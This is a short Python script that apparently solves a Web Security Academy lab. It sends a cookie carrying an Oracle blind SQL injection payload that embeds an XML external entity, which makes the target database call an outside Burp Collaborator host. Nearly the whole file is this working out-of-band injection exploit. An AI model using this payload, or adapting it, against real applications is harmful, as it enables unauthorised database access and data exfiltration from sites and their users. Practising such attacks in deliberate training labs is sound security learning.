import requests
from typing import Optional

BASE_URL="https://0a3500d303a1d63b80f708b3003000d1.web-security-academy.net"
session = requests.Session()

def get_request(url:str, cookies:dict[str,str], timeout:int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, cookies=cookies, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
    
def main():
    cookies={
        "TrackingId":"x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
        "session":""
    }

    response = get_request(BASE_URL, cookies=cookies)
    print(response.text)


if __name__ == "__main__":
    main()